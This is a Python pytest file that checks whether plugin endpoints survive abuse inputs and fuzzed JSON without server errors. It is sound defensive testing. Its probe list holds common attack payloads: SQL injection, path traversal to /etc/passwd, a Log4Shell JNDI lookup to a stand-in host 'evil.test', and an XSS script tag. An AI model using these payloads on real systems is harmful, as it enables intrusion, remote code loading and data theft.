from __future__ import annotations

import pytest
from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st

from tests.plugin_expectations import VALID_EXECUTE_CASES

MALICIOUS_STRINGS = [
    "' OR '1'='1",
    "../../../../etc/passwd",
    "${jndi:ldap://evil.test/a}",
    "<script>alert(1)</script>",
    "A" * 8192,
]


@pytest.mark.security
def test_common_abuse_payloads_do_not_crash(plugin, plugin_client_factory):
    if plugin.main_file is None:
        pytest.skip("Plugin has no FastAPI app")
    client = plugin_client_factory(plugin)
    base_case = (VALID_EXECUTE_CASES.get(plugin.name) or [{"type": plugin.capabilities[0], "payload": {}}])[0]
    for probe in MALICIOUS_STRINGS:
        mutated = {
            "type": base_case["type"],
            "payload": {
                **base_case.get("payload", {}),
                "probe": probe,
                "nested": {"probe": probe},
            },
        }
        response = client.post(plugin.entrypoints.get("execute", "/execute"), json=mutated)
        assert response.status_code < 500, f"{plugin.name} crashed on malicious probe {probe!r}"


@given(st.dictionaries(st.text(min_size=1, max_size=20), st.one_of(st.integers(), st.floats(allow_nan=False), st.text(max_size=50), st.booleans(), st.none()), max_size=8))
@settings(max_examples=25, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture])
@pytest.mark.security
def test_generic_fuzzed_json_never_500(plugin, plugin_client_factory, payload):
    if plugin.main_file is None:
        pytest.skip("Plugin has no FastAPI app")
    client = plugin_client_factory(plugin)
    action = (VALID_EXECUTE_CASES.get(plugin.name) or [{"type": plugin.capabilities[0]}])[0]["type"]
    response = client.post(plugin.entrypoints.get("execute", "/execute"), json={"type": action, "payload": payload})
    assert response.status_code < 500
